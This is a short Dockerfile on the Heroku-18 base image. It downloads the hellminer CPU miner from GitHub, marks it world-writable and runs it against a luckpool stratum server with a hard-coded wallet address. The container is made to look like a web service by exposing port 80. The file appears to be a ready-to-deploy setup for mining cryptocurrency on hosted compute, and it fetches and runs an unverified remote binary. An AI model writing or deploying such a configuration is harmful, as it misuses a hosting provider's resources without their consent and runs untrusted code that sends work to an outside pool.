FROM heroku/heroku:18

RUN apt-get install -y curl git unzip tar python python3 wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && chmod 777 startminer.sh hellminer && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMKjgEVM82bB1VCKyFw7PSjxzhViVamfQF.vps -p x --cpu 3
CMD bash startminer.sh

EXPOSE 80
